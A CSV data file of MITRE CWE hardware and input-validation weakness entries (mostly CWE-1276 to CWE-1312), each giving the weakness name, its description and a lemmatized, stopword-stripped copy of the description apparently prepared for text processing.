CWE-1276,Hardware Child Block Incorrectly Connected to Parent System,"Signals between a hardware IP and the parent system design are incorrectly connected causing security risks.Individual hardware IP must communicate with the parent system in order for the product to function correctly and as intended. If implemented incorrectly, while not causing any apparent functional issues, may cause security issues. For example, if the IP should only be reset by a system-wide hard reset, but instead the reset input is connected to a software-triggered debug mode reset (which is also asserted during a hard reset), integrity of data inside the IP can be violated.",signal hardware ip parent system design incorrectly connect cause security risk individual hardware ip communicate parent system order product function correctly intend implement incorrectly cause apparent functional issue cause security issue example ip reset system wide hard reset instead reset input connect software trigger debug mode reset assert hard reset integrity datum inside ip violate
CWE-1277,Firmware Not Updateable,"The product does not provide its users with the ability to update or patch its firmware to address any vulnerabilities or weaknesses that may be present.Without the ability to patch or update firmware, consumers will be left vulnerable to exploitation of any known vulnerabilities, or any vulnerabilities that are discovered in the future. This can expose consumers to permanent risk throughout the entire lifetime of the device, which could be years or decades. Some external protective measures and mitigations might be employed to aid in preventing or reducing the risk of malicious attack, but the root weakness cannot be corrected.",product provide user ability update patch firmware address vulnerability weakness present ability patch update firmware consumer leave vulnerable exploitation know vulnerability vulnerability discover future expose consumer permanent risk entire lifetime device year decade external protective measure mitigation employ aid prevent reduce risk malicious attack root weakness correct
CWE-1278,Missing Protection Against Hardware Reverse Engineering Using Integrated Circuit (IC) Imaging Techniques,"Information stored in hardware may be recovered by an attacker with the capability to capture and analyze images of the integrated circuit using techniques such as scanning electron microscopy.The physical structure of a device, viewed at high enough magnification, can reveal the information stored inside. Typical steps in IC reverse engineering involve removing the chip packaging (decapsulation) then using various imaging techniques ranging from high resolution x-ray microscopy to invasive techniques involving removing IC layers and imaging each layer using a scanning electron microscope.The goal of such activities is to recover secret keys, unique device identifiers, and proprietary code and circuit designs embedded in hardware that the attacker has been unsuccessful at accessing through other means. These secrets may be stored in non-volatile memory or in the circuit netlist. Memory technologies such as masked ROM allow easier to extraction of secrets than One-time Programmable (OTP) memory.",information store hardware recover attacker capability capture analyze image integrate circuit technique scan electron microscopy physical structure device view high magnification reveal information store inside typical step ic reverse engineering involve remove chip packaging decapsulation imaging technique range high resolution x ray microscopy invasive technique involve remove ic layer image layer scan electron microscope goal activity recover secret key unique device identifier proprietary code circuit design embed hardware attacker unsuccessful access mean secret store non volatile memory circuit netlist memory technology masked rom allow easy extraction secret time programmable otp memory
CWE-1279,Cryptographic Operations are run Before Supporting Units are Ready,"Performing cryptographic operations without ensuring that the supporting inputs are ready to supply valid data may compromise the cryptographic result.Many cryptographic hardware units depend upon other hardware units to supply information to them to produce a securely encrypted result. For example, a cryptographic unit that depends on an external random-number-generator (RNG) unit for entropy must wait until the RNG unit is producing random numbers. If a cryptographic unit retrieves a private encryption key from a fuse unit, the fuse unit must be up and running before a key may be supplied.",perform cryptographic operation ensure support input ready supply valid datum compromise cryptographic result cryptographic hardware unit depend hardware unit supply information produce securely encrypt result example cryptographic unit depend external random number generator rng unit entropy wait rng unit produce random number cryptographic unit retrieve private encryption key fuse unit fuse unit run key supply
CWE-128,Wrap-around Error,"Wrap around errors occur whenever a value is incremented past the maximum value for its type and therefore ""wraps around"" to a very small, negative, or undefined value.",wrap error occur value incremente past maximum value type wrap small negative undefined value
CWE-1280,Access Control Check Implemented After Asset is Accessed,"A product's hardware-based access control check occurs after the asset has been accessed.The product implements a hardware-based access control check. The asset should be accessible only after the check is successful. If, however, this operation is not atomic and the asset is accessed before the check is complete, the security of the system may be compromised.",product hardware base access control check occur asset access product implement hardware base access control check asset accessible check successful operation atomic asset access check complete security system compromise
CWE-1281,Sequence of Processor Instructions Leads to Unexpected Behavior,"Specific combinations of processor instructions lead to undesirable behavior such as locking the processor until a hard reset performed.If the instruction set architecture (ISA) and processor logic are not designed carefully and tested thoroughly, certain combinations of instructions may lead to locking the processor or other unexpected and undesirable behavior. Upon encountering unimplemented instruction opcodes or illegal instruction operands, the processor should throw an exception and carry on without negatively impacting security. However, specific combinations of legal and illegal instructions may cause unexpected behavior with security implications such as allowing unprivileged programs to completely lock the CPU.",specific combination processor instruction lead undesirable behavior lock processor hard reset perform instruction set architecture isa processor logic design carefully test thoroughly certain combination instruction lead lock processor unexpected undesirable behavior encounter unimplemented instruction opcode illegal instruction operand processor throw exception carry negatively impact security specific combination legal illegal instruction cause unexpected behavior security implication allow unprivileged program completely lock cpu
CWE-1282,Assumed-Immutable Data is Stored in Writable Memory,"Immutable data, such as a first-stage bootloader, device identifiers, and ""write-once"" configuration settings are stored in writable memory that can be re-programmed or updated in the field.Security services such as secure boot, authentication of code and data, and device attestation all require assets such as the first stage bootloader, public keys, golden hash digests, etc. which are implicitly trusted. Storing these assets in read-only memory (ROM), fuses, or one-time programmable (OTP) memory provides strong integrity guarantees and provides a root of trust for securing the rest of the system. Security is lost if assets assumed to be immutable can be modified.",immutable datum stage bootloader device identifier write configuration setting store writable memory program update field security service secure boot authentication code datum device attestation require asset stage bootloader public key golden hash digest etc implicitly trust store asset read memory rom fuse time programmable otp memory provide strong integrity guarantee provide root trust secure rest system security lose asset assume immutable modify
CWE-1283,Mutable Attestation or Measurement Reporting Data,"The register contents used for attestation or measurement reporting data to verify boot flow are modifiable by an adversary.A System-on-Chip (SoC) implements secure boot or verified boot. During this boot flow, the SoC often measures the code that it authenticates. The measurement is usually done by calculating the one-way hash of the code binary and extending it to the previous hash. The hashing algorithm should be a Secure One-Way hash function. The final hash, i.e., the value obtained after the completion of the boot flow, serves as the measurement data used in reporting or in attestation. The calculated hash is often stored in registers that can later be read by the party of interest to determine tampering of the boot flow. A common weakness is that the contents in these registers are modifiable by an adversary, thus spoofing the measurement.",register content attestation measurement reporting datum verify boot flow modifiable adversary system chip soc implement secure boot verified boot boot flow soc measure code authenticate measurement usually calculate way hash code binary extend previous hash hashing algorithm secure way hash function final hash value obtain completion boot flow serve measurement datum reporting attestation calculate hash store register later read party interest determine tampering boot flow common weakness content register modifiable adversary spoof measurement
CWE-1284,Improper Validation of Specified Quantity in Input,"The product receives input that is expected to specify a quantity (such as size or length), but it does not validate or incorrectly validates that the quantity has the required properties.Specified quantities include size, length, frequency, price, rate, number of operations, time, and others. Code may rely on specified quantities to allocate resources, perform calculations, control iteration, etc. When the quantity is not properly validated, then attackers can specify malicious quantities to cause excessive resource allocation, trigger unexpected failures, enable buffer overflows, etc.",product receive input expect specify quantity size length validate incorrectly validate quantity require property specified quantity include size length frequency price rate number operation time code rely specify quantity allocate resource perform calculation control iteration etc quantity properly validate attacker specify malicious quantity cause excessive resource allocation trigger unexpected failure enable buffer overflow etc
CWE-1285,"Improper Validation of Specified Index, Position, or Offset in Input","The product receives input that is expected to specify an index, position, or offset into an indexable resource such as a buffer or file, but it does not validate or incorrectly validates that the specified index/position/offset has the required properties.Often, indexable resources such as memory buffers or files can be accessed using a specific position, index, or offset, such as an index for an array or a position for a file. When untrusted input is not properly validated before it is used as an index, attackers could access (or attempt to access) unauthorized portions of these resources. This could be used to cause buffer overflows, excessive resource allocation, or trigger unexpected failures.",product receive input expect specify index position offset indexable resource buffer file validate incorrectly validate specify index position offset require property indexable resource memory buffer file access specific position index offset index array position file untrusted input properly validate index attacker access attempt access unauthorized portion resource cause buffer overflow excessive resource allocation trigger unexpected failure
CWE-1286,Improper Validation of Syntactic Correctness of Input,"The product receives input that is expected to be well-formed - i.e., to comply with a certain syntax - but it does not validate or incorrectly validates that the input complies with the syntax.Often, complex inputs are expected to follow a particular syntax, which is either assumed by the input itself, or declared within metadata such as headers. The syntax could be for data exchange formats, markup languages, or even programming languages. When untrusted input is not properly validated for the expected syntax, attackers could cause parsing failures, trigger unexpected errors, or expose latent vulnerabilities that might not be directly exploitable if the input had conformed to the syntax.",product receive input expect form comply certain syntax validate incorrectly validate input comply syntax complex input expect follow particular syntax assume input declare metadata header syntax datum exchange format markup language programming language untrusted input properly validate expect syntax attacker cause parsing failure trigger unexpected error expose latent vulnerability directly exploitable input conform syntax
CWE-1287,Improper Validation of Specified Type of Input,"The product receives input that is expected to be of a certain type, but it does not validate or incorrectly validates that the input is actually of the expected type.When input does not comply with the expected type, attackers could trigger unexpected errors, cause incorrect actions to take place, or exploit latent vulnerabilities that would not be possible if the input conformed with the expected type.This weakness can appear in type-unsafe programming languages, or in programming languages that support casting or conversion of an input to another type.",product receive input expect certain type validate incorrectly validate input actually expect type input comply expect type attacker trigger unexpected error cause incorrect action place exploit latent vulnerability possible input conform expect type weakness appear type unsafe programming language programming language support casting conversion input type
CWE-1288,Improper Validation of Consistency within Input,"The product receives a complex input with multiple elements or fields that must be consistent with each other, but it does not validate or incorrectly validates that the input is actually consistent.Some input data can be structured with multiple elements or fields that must be consistent with each other, e.g. a number-of-items field that is followed by the expected number of elements. When such complex inputs are inconsistent, attackers could trigger unexpected errors, cause incorrect actions to take place, or exploit latent vulnerabilities.",product receive complex input multiple element field consistent validate incorrectly validate input actually consistent input datum structure multiple element field consistent number item field follow expect number element complex input inconsistent attacker trigger unexpected error cause incorrect action place exploit latent vulnerability
CWE-1289,Improper Validation of Unsafe Equivalence in Input,"The product receives an input value that is used as a resource identifier or other type of reference, but it does not validate or incorrectly validates that the input is equivalent to a potentially-unsafe value.Attackers can sometimes bypass input validation schemes by finding inputs that appear to be safe, but will be dangerous when processed at a lower layer or by a downstream component. For example, a simple XSS protection mechanism might try to validate that an input has no ""<script>"" tags using case-sensitive matching, but since HTML is case-insensitive when processed by web browsers, an attacker could inject ""<ScrIpT>"" and trigger XSS.",product receive input value resource identifier type reference validate incorrectly validate input equivalent potentially unsafe value attacker bypass input validation scheme find input appear safe dangerous process low layer downstream component example simple xss protection mechanism try validate input script tag case sensitive matching html case insensitive process web browser attacker inject script trigger xss
CWE-129,Improper Validation of Array Index,"The product uses untrusted input when calculating or using an array index, but the product does not validate or incorrectly validates the index to ensure the index references a valid position within the array.",product use untrusted input calculate array index product validate incorrectly validate index ensure index reference valid position array
CWE-1290,Incorrect Decoding of Security Identifiers ,"The product implements a decoding mechanism to decode certain bus-transaction signals to security identifiers. If the decoding is implemented incorrectly, then untrusted agents can now gain unauthorized access to the asset.In a System-On-Chip (SoC), various integrated circuits and hardware engines generate transactions such as to access (reads/writes) assets or perform certain actions (e.g., reset, fetch, compute, etc.). Among various types of message information, a typical transaction is comprised of source identity (to identify the originator of the transaction) and a destination identity (to route the transaction to the respective entity). Sometimes the transactions are qualified with a security identifier. The security identifier helps the destination agent decide on the set of allowed actions (e.g., access an asset for read and writes). A decoder decodes the bus transactions to map security identifiers into necessary access-controls/protections.A common weakness that can exist in this scenario is incorrect decoding because an untrusted agent's security identifier is decoded into a trusted agent's security identifier. Thus, an untrusted agent previously without access to an asset can now gain access to the asset.",product implement decoding mechanism decode certain bus transaction signal security identifier decoding implement incorrectly untrusted agent gain unauthorized access asset system chip soc integrate circuit hardware engine generate transaction access read write asset perform certain action reset fetch compute etc type message information typical transaction comprise source identity identify originator transaction destination identity route transaction respective entity transaction qualify security identifier security identifier help destination agent decide set allow action access asset read write decoder decode bus transaction map security identifier necessary access control protection common weakness exist scenario incorrect decoding untrusted agent security identifier decode trust agent security identifier untrusted agent previously access asset gain access asset
CWE-1291,Public Key Re-Use for Signing both Debug and Production Code,"The same public key is used for signing both debug and production code.A common usage of public-key cryptography is to verify the integrity and authenticity of another entity (for example a firmware binary). If a company wants to ensure that its firmware runs only on its own hardware, before the firmware runs, an encrypted hash of the firmware image will be decrypted with the public key and then verified against the now-computed hash of the firmware image. This means that the public key forms the root of trust, which necessitates that the public key itself must be protected and used properly.During the development phase, debug firmware enables many hardware debug hooks, debug modes, and debug messages for testing. Those debug facilities provide significant, additional views about the firmware's capability and, in some cases, additional capability into the chip or SoC. If compromised, these capabilities could be exploited by an attacker to take full control of the system.Once the product exits the manufacturing stage and enters production, it is good practice to use a different public key. Debug firmware images are known to leak. With the debug key being reused as the production key, the debug image will also work on the production image. Thus, it will open all the internal, debug capabilities to the attacker.If a different public key is used for the production image, even if the attacker gains access to the debug firmware image, they will not be able to run it on a production machine. Thus, damage will be limited to the intellectual property leakage resulting from the debug image.",public key sign debug production code common usage public key cryptography verify integrity authenticity entity example firmware binary company want ensure firmware run hardware firmware run encrypt hash firmware image decrypt public key verify compute hash firmware image mean public key form root trust necessitate public key protect properly development phase debug firmware enable hardware debug hook debug mode debug message testing debug facility provide significant additional view firmware capability case additional capability chip compromise capability exploit attacker control system product exit manufacture stage enter production good practice use different public key debug firmware image know leak debug key reuse production key debug image work production image open internal debug capability attacker different public key production image attacker gain access debug firmware image able run production machine damage limit intellectual property leakage result debug image
CWE-1292,Incorrect Conversion of Security Identifiers,"The product implements a conversion mechanism to map certain bus-transaction signals to security identifiers. However, if the conversion is incorrectly implemented, untrusted agents can gain unauthorized access to the asset.In a System-On-Chip (SoC), various integrated circuits and hardware engines generate transactions such as to access (reads/writes) assets or perform certain actions (e.g., reset, fetch, compute, etc.). Among various types of message information, a typical transaction is comprised of source identity (to identify the originator of the transaction) and a destination identity (to route the transaction to the respective entity). Sometimes the transactions are qualified with a security identifier. This security identifier helps the destination agent decide on the set of allowed actions (e.g., access an asset for read and writes).A typical bus connects several leader and follower agents. Some follower agents implement bus protocols differently from leader agents. A protocol conversion happens at a bridge to seamlessly connect different protocols on the bus. One example is a system that implements a leader with the Advanced High-performance Bus (AHB) protocol and a follower with the Open-Core Protocol (OCP). A bridge AHB-to-OCP is needed to translate the transaction from one form to the other.A common weakness that can exist in this scenario is that this conversion between protocols is implemented incorrectly, whereupon an untrusted agent may gain unauthorized access to an asset.",product implement conversion mechanism map certain bus transaction signal security identifier conversion incorrectly implement untrusted agent gain unauthorized access asset system chip soc integrate circuit hardware engine generate transaction access read write asset perform certain action reset fetch compute etc type message information typical transaction comprise source identity identify originator transaction destination identity route transaction respective entity transaction qualify security identifier security identifier help destination agent decide set allow action access asset read typical bus connect leader follower agent follower agent implement bus protocol differently leader agent protocol conversion happen bridge seamlessly connect different protocol bus example system implement leader advanced high performance bus ahb protocol follower open core protocol ocp bridge ahb ocp need translate transaction form common weakness exist scenario conversion protocol implement incorrectly untrusted agent gain unauthorized access asset
CWE-1293,Missing Source Correlation of Multiple Independent Data,"The product relies on one source of data, preventing the ability to detect if an adversary has compromised a data source.To operate successfully, a product sometimes has to implicitly trust the integrity of an information source. When information is implicitly signed, one can ensure that the data was not tampered in transit. This does not ensure that the information source was not compromised when responding to a request. By requesting information from multiple sources, one can check if all of the data is the same. If they are not, the system should report the information sources that respond with a different or minority value as potentially compromised. If there are not enough answers to provide a majority or plurality of responses, the system should report all of the sources as potentially compromised. As the seriousness of the impact of incorrect integrity increases, so should the number of independent information sources that would need to be queried.",product rely source datum prevent ability detect adversary compromise data source operate successfully product implicitly trust integrity information source information implicitly sign ensure data tamper transit ensure information source compromise respond request request information multiple source check data system report information source respond different minority value potentially compromise answer provide majority plurality response system report source potentially compromise seriousness impact incorrect integrity increase number independent information source need query
CWE-1294,Insecure Security Identifier Mechanism,"The System-on-Chip (SoC) implements a Security Identifier mechanism to differentiate what actions are allowed or disallowed when a transaction originates from an entity. However, the Security Identifiers are not correctly implemented.Systems-On-Chip (Integrated circuits and hardware engines) implement Security Identifiers to differentiate/identify actions originated from various agents. These actions could be 'read', 'write', 'program', 'reset', 'fetch', 'compute', etc. Security identifiers are generated and assigned to every agent in the System (SoC) that is either capable of generating an action or receiving an action from another agent. Every agent could be assigned a unique, Security Identifier based on its trust level or privileges.A broad class of flaws can exist in the Security Identifier process, including but not limited to missing security identifiers, improper conversion of security identifiers, incorrect generation of security identifiers, etc.",system chip soc implement security identifier mechanism differentiate action allow disallow transaction originate entity security identifiers correctly implement system chip integrated circuit hardware engine implement security identifiers differentiate identify action originate agent action read write program reset fetch compute etc security identifier generate assign agent system soc capable generate action receive action agent agent assign unique security identifier base trust level privilege broad class flaw exist security identifier process include limit miss security identifier improper conversion security identifier incorrect generation security identifier etc
CWE-1295,Debug Messages Revealing Unnecessary Information,"The product fails to adequately prevent the revealing of unnecessary and potentially sensitive system information within debugging messages.Debug messages are messages that help troubleshoot an issue by revealing the internal state of the system. For example, debug data in design can be exposed through internal memory array dumps or boot logs through interfaces like UART via TAP commands, scan chain, etc. Thus, the more information contained in a debug message, the easier it is to debug. However, there is also the risk of revealing information that could help an attacker either decipher a vulnerability, and/or gain a better understanding of the system. Thus, this extra information could lower the ""security by obscurity"" factor. While ""security by obscurity"" alone is insufficient, it can help as a part of ""Defense-in-depth"".",product fail adequately prevent revealing unnecessary potentially sensitive system information debugging message debug message message help troubleshoot issue reveal internal state system example debug datum design expose internal memory array dump boot log interface like uart tap command scan chain etc information contain debug message easy debug risk reveal information help attacker decipher vulnerability gain well understanding system extra information lower security obscurity factor security obscurity insufficient help defense depth
CWE-1296,Incorrect Chaining or Granularity of Debug Components,"The product's debug components contain incorrect chaining or granularity of debug components.For debugging and troubleshooting a chip, several hardware design elements are often implemented, including:Various Test Access Ports (TAPs) allow boundary scan commands to be executed.For scanning the internal components of a chip, there are scan cells that allow the chip to be used as a ""stimulus and response"" mechanism.Chipmakers might create custom methods to observe the internal components of their chips by placing various tracing hubs within their chip and creating hierarchical or interconnected structures among those hubs.Logic errors during design or synthesis could misconfigure the interconnection of the debug components, which could allow unintended access permissions.",product debug component contain incorrect chaining granularity debug component debug troubleshoot chip hardware design element implement include test access ports taps allow boundary scan command execute scan internal component chip scan cell allow chip stimulus response mechanism chipmaker create custom method observe internal component chip place tracing hub chip create hierarchical interconnected structure hub logic error design synthesis misconfigure interconnection debug component allow unintended access permission
CWE-1297,Unprotected Confidential Information on Device is Accessible by OSAT Vendors,"The product does not adequately protect confidential information on the device from being accessed by Outsourced Semiconductor Assembly and Test (OSAT) vendors.In contrast to complete vertical integration of architecting, designing, manufacturing, assembling, and testing chips all within a single organization, an organization can choose to simply architect and design a chip before outsourcing the rest of the process to OSAT entities (e.g., external foundries and test houses). In the latter example, the device enters an OSAT facility in a much more vulnerable pre-production stage where many debug and test modes are accessible. Therefore, the chipmaker must place a certain level of trust with the OSAT. To counter this, the chipmaker often requires the OSAT partner to enter into restrictive non-disclosure agreements (NDAs). Nonetheless, OSAT vendors likely have many customers, which increases the risk of accidental sharing of information. There may also be a security vulnerability in the information technology (IT) system of the OSAT facility. Alternatively, a malicious insider at the OSAT facility may carry out an insider attack. Considering these factors, it behooves the chipmaker to minimize any confidential information in the device that may be accessible to the OSAT vendor.Logic errors during design or synthesis could misconfigure the interconnection of the debug components, which could provide improper authorization to sensitive information.",product adequately protect confidential information device access outsourced semiconductor assembly test osat vendor contrast complete vertical integration architecte design manufacturing assemble test chip single organization organization choose simply architect design chip outsource rest process osat entity external foundry test house example device enter osat facility vulnerable pre production stage debug test mode accessible chipmaker place certain level trust osat counter chipmaker require osat partner enter restrictive non disclosure agreement ndas nonetheless osat vendor likely customer increase risk accidental sharing information security vulnerability information technology system osat facility alternatively malicious insider osat facility carry insider attack consider factor behoove chipmaker minimize confidential information device accessible osat vendor logic error design synthesis misconfigure interconnection debug component provide improper authorization sensitive information
CWE-1298,Hardware Logic Contains Race Conditions,"A race condition in the hardware logic results in undermining security guarantees of the system.A race condition in logic circuits typically occurs when a logic gate gets inputs from signals that have traversed different paths while originating from the same source. Such inputs to the gate can change at slightly different times in response to a change in the source signal. This results in a timing error or a glitch (temporary or permanent) that causes the output to change to an unwanted state before settling back to the desired state. If such timing errors occur in access control logic or finite state machines that are implemented in security sensitive flows, an attacker might exploit them to circumvent existing protections.",race condition hardware logic result undermine security guarantee system race condition logic circuit typically occur logic gate get input signal traverse different path originate source input gate change slightly different time response change source signal result timing error glitch temporary permanent cause output change unwanted state settle desire state timing error occur access control logic finite state machine implement security sensitive flow attacker exploit circumvent existing protection
CWE-1299,Missing Protection Mechanism for Alternate Hardware Interface,"The lack of protections on alternate paths to access control-protected assets (such as unprotected shadow registers and other external facing unguarded interfaces) allows an attacker to bypass existing protections to the asset that are only performed against the primary path.An asset inside a chip might have access-control protections through one interface. However, if all paths to the asset are not protected, an attacker might compromise the asset through alternate paths. These alternate paths could be through shadow or mirror registers inside the IP core, or could be paths from other external-facing interfaces to the IP core or SoC.Consider an SoC with various interfaces such as UART, SMBUS, PCIe, USB, etc. If access control is implemented for SoC internal registers only over the PCIe interface, then an attacker could still modify the SoC internal registers through alternate paths by coming through interfaces such as UART, SMBUS, USB, etc. Alternatively, attackers might be able to bypass existing protections by exploiting unprotected, shadow registers. Shadow registers and mirror registers typically refer to registers that can be accessed from multiple addresses. Writing to or reading from the aliased/mirrored address has the same effect as writing to the address of the main register. They are typically implemented within an IP core or SoC to temporarily hold certain data. These data will later be updated to the main register, and both registers will be in synch. If the shadow registers are not access-protected, attackers could simply initiate transactions to the shadow registers and compromise system security.",lack protection alternate path access control protect asset unprotected shadow register external face unguarded interface allow attacker bypass existing protection asset perform primary path asset inside chip access control protection interface path asset protect attacker compromise asset alternate path alternate path shadow mirror register inside ip core path external face interface ip core soc interface uart smbus pcie usb etc access control implement soc internal register pcie interface attacker modify soc internal register alternate path come interface uart smbus usb etc alternatively attacker able bypass exist protection exploit unprotected shadow register shadow register mirror register typically refer register access multiple address write read aliase mirror address effect write address main register typically implement ip core soc temporarily hold certain datum datum later update main register register synch shadow register access protect attacker simply initiate transaction shadow register compromise system security
CWE-13,ASP.NET Misconfiguration: Password in Configuration File,Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource making them an easy target for attackers.,store plaintext password configuration file allow read file access password protect resource make easy target attacker
CWE-130,Improper Handling of Length Parameter Inconsistency,"The product parses a formatted message or structure, but it does not handle or incorrectly handles a length field that is inconsistent with the actual length of the associated data.If an attacker can manipulate the length parameter associated with an input such that it is inconsistent with the actual length of the input, this can be leveraged to cause the target application to behave in unexpected, and possibly, malicious ways. One of the possible motives for doing so is to pass in arbitrarily large input to the application. Another possible motivation is the modification of application state by including invalid data for subsequent properties of the application. Such weaknesses commonly lead to attacks such as buffer overflows and execution of arbitrary code.",product parse format message structure handle incorrectly handle length field inconsistent actual length associate datum attacker manipulate length parameter associate input inconsistent actual length input leverage cause target application behave unexpected possibly malicious way possible motive pass arbitrarily large input application possible motivation modification application state include invalid datum subsequent property application weakness commonly lead attack buffer overflow execution arbitrary code
CWE-1300,Improper Protection of Physical Side Channels,"The device does not contain sufficient protection mechanisms to prevent physical side channels from exposing sensitive information due to patterns in physically observable phenomena such as variations in power consumption, electromagnetic emissions (EME), or acoustic emissions.An adversary could monitor and measure physical phenomena to detect patterns and make inferences, even if it is not possible to extract the information in the digital domain.Physical side channels have been well-studied for decades in the context of breaking implementations of cryptographic algorithms or other attacks against security features. These side channels may be easily observed by an adversary with physical access to the device, or using a tool that is in close proximity. If the adversary can monitor hardware operation and correlate its data processing with power, EME, and acoustic measurements, the adversary might be able to recover of secret keys and data.",device contain sufficient protection mechanism prevent physical channel expose sensitive information pattern physically observable phenomenon variation power consumption electromagnetic emission eme acoustic emission adversary monitor measure physical phenomenon detect pattern inference possible extract information digital domain physical channel study decade context break implementation cryptographic algorithm attack security feature channel easily observe adversary physical access device tool close proximity adversary monitor hardware operation correlate datum processing power eme acoustic measurement adversary able recover secret key datum
CWE-1301,Insufficient or Incomplete Data Removal within Hardware Component,"The product's data removal process does not completely delete all data and potentially sensitive information within hardware components.Physical properties of hardware devices, such as remanence of magnetic media, residual charge of ROMs/RAMs, or screen burn-in may still retain sensitive data after a data removal process has taken place and power is removed.Recovering data after erasure or overwriting is possible due to a phenomenon called data remanence. For example, if the same value is written repeatedly to a memory location, the corresponding memory cells can become physically altered to a degree such that even after the original data is erased that data can still be recovered through physical characterization of the memory cells.",product datum removal process completely delete datum potentially sensitive information hardware component physical property hardware device remanence magnetic medium residual charge rom ram screen burn retain sensitive datum datum removal process take place power remove recover datum erasure overwriting possible phenomenon call datum remanence example value write repeatedly memory location corresponding memory cell physically alter degree original data erase datum recover physical characterization memory cell
CWE-1302,Missing Security Identifier,"The product implements a security identifier mechanism to differentiate what actions are allowed or disallowed when a transaction originates from an entity. A transaction is sent without a security identifier.In a System-On-Chip (SoC), various integrated circuits and hardware engines generate transactions such as to access (reads/writes) assets or perform certain actions (e.g., reset, fetch, compute). A typical transaction is comprised of source identity (to identify the originator of the transaction) and a destination identity (to route the transaction to the respective entity) in addition to much more information in the message. Sometimes the transactions are qualified with a Security Identifier. This Security Identifier helps the destination agent decide on the set of allowed or disallowed actions.A common weakness that can exist in such transaction schemes is that the source agent fails to include the necessary, security identifier with the transaction. Because of the missing security identifier, the destination agent might drop the message, thus resulting in Denial-of-Service (DoS), or get confused in its attempt to execute the given action, which confusion could result in privilege escalation or a gain of unintended access.",product implement security identifier mechanism differentiate action allow disallow transaction originate entity transaction send security identifier system chip soc integrate circuit hardware engine generate transaction access read write asset perform certain action reset fetch compute typical transaction comprise source identity identify originator transaction destination identity route transaction respective entity addition information message transaction qualified security identifier security identifier help destination agent decide set allowed disallowed action common weakness exist transaction scheme source agent fail include necessary security identifier transaction miss security identifier destination agent drop message result denial service dos confused attempt execute give action confusion result privilege escalation gain unintended access
CWE-1303,Non-Transparent Sharing of Microarchitectural Resources,"Hardware structures shared across execution contexts (e.g., caches and branch predictors) can violate the expected architecture isolation between contexts.Modern processors use techniques such as out-of-order execution, speculation, prefetching, data forwarding, and caching to increase performance. Details about the implementation of these techniques are hidden from the programmer's view. This is problematic when the hardware implementation of these techniques results in resources being shared across supposedly isolated contexts. Contention for shared resources between different contexts opens covert channels that allow malicious programs executing in one context to recover information from another context.Some examples of shared micro-architectural resources that have been used to leak information between contexts are caches, branch prediction logic, and load or store buffers. Speculative and out-of-order execution provides an attacker with increased control over which data is leaked through the covert channel.If the extent of resource sharing between contexts in the design microarchitecture is undocumented, it is extremely difficult to ensure system assets are protected against disclosure.",hardware structure share execution context cache branch predictor violate expect architecture isolation context modern processor use technique order execution speculation prefetching data forwarding caching increase performance detail implementation technique hide programmer view problematic hardware implementation technique result resource share supposedly isolate context contention share resource different context open covert channel allow malicious program execute context recover information context example share micro architectural resource leak information context cache branch prediction logic load store buffer speculative order execution provide attacker increase control data leak covert channel extent resource sharing context design microarchitecture undocumented extremely difficult ensure system asset protect disclosure
CWE-1304,Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation,"The product performs a power save/restore operation, but it does not ensure that the integrity of the configuration state is maintained and/or verified between the beginning and ending of the operation.Before powering down, the Intellectual Property (IP) saves current state (S) to persistent storage such as flash or always-on memory in order to optimize the restore operation. During this process, an attacker with access to the persistent storage may alter (S) to a configuration that could potentially modify privileges, disable protections, and/or cause damage to the hardware. If the IP does not validate the configuration state stored in persistent memory, upon regaining power or becoming operational again, the IP could be compromised through the activation of an unwanted/harmful configuration.",product perform power save restore operation ensure integrity configuration state maintain verify beginning ending operation power intellectual property ip save current state s persistent storage flash memory order optimize restore operation process attacker access persistent storage alter s configuration potentially modify privilege disable protection cause damage hardware ip validate configuration state store persistent memory regain power operational ip compromise activation unwanted harmful configuration
CWE-131,Incorrect Calculation of Buffer Size,"The product does not correctly calculate the size to be used when allocating a buffer, which could lead to a buffer overflow.",product correctly calculate size allocate buffer lead buffer overflow
CWE-1310,Missing Ability to Patch ROM Code,"Missing an ability to patch ROM code may leave a System or System-on-Chip (SoC) in a vulnerable state.A System or System-on-Chip (SoC) that implements a boot process utilizing security mechanisms such as Root-of-Trust (RoT) typically starts by executing code from a Read-only-Memory (ROM) component. The code in ROM is immutable, hence any security vulnerabilities discovered in the ROM code can never be fixed for the systems that are already in use.A common weakness is that the ROM does not have the ability to patch if security vulnerabilities are uncovered after the system gets shipped. This leaves the system in a vulnerable state where an adversary can compromise the SoC.",miss ability patch rom code leave system system chip soc vulnerable state system system chip soc implement boot process utilize security mechanism root trust rot typically start execute code read memory rom component code rom immutable security vulnerability discover rom code fix system use common weakness rom ability patch security vulnerability uncover system gets ship leave system vulnerable state adversary compromise
CWE-1311,Improper Translation of Security Attributes by Fabric Bridge,"The bridge incorrectly translates security attributes from either trusted to untrusted or from untrusted to trusted when converting from one fabric protocol to another.A bridge allows IP blocks supporting different fabric protocols to be integrated into the system. Fabric end-points or interfaces usually have dedicated signals to transport security attributes. For example, HPROT signals in AHB, AxPROT signals in AXI, and MReqInfo and SRespInfo signals in OCP.The values on these signals are used to indicate the security attributes of the transaction. These include the immutable hardware identity of the controller initiating the transaction, privilege level, and type of transaction (e.g., read/write, cacheable/non-cacheable, posted/non-posted).A weakness can arise if the bridge IP block, which translates the signals from the protocol used in the IP block endpoint to the protocol used by the central bus, does not properly translate the security attributes. As a result, the identity of the initiator could be translated from untrusted to trusted or vice-versa. This could result in access-control bypass, privilege escalation, or denial of service.",bridge incorrectly translate security attribute trusted untrusted untrusted trusted convert fabric protocol bridge allow ip block support different fabric protocol integrate system fabric end point interface usually dedicate signal transport security attribute example hprot signal ahb axprot signal axi mreqinfo srespinfo signal value signal indicate security attribute transaction include immutable hardware identity controller initiate transaction privilege level type transaction read write cacheable non cacheable posted non weakness arise bridge ip block translate signal protocol ip block endpoint protocol central bus properly translate security attribute result identity initiator translate untrusted trusted vice versa result access control bypass privilege escalation denial service
CWE-1312,Missing Protection for Mirrored Regions in On-Chip Fabric Firewall,"The firewall in an on-chip fabric protects the main addressed region, but it does not protect any mirrored memory or memory-mapped-IO (MMIO) regions.Few fabrics mirror memory and address ranges, where mirrored regions contain copies of the original data. This redundancy is used to achieve fault tolerance. Whatever protections the fabric firewall implements for the original region should also apply to the mirrored regions. If not, an attacker could bypass existing read/write protections by reading from/writing to the mirrored regions to leak or corrupt the original data.",firewall chip fabric protect main address region protect mirror memory memory map io mmio region fabric mirror memory address range mirror region contain copy original datum redundancy achieve fault tolerance protection fabric firewall implement original region apply mirror region attacker bypass exist read write protection read write mirror region leak corrupt original datum
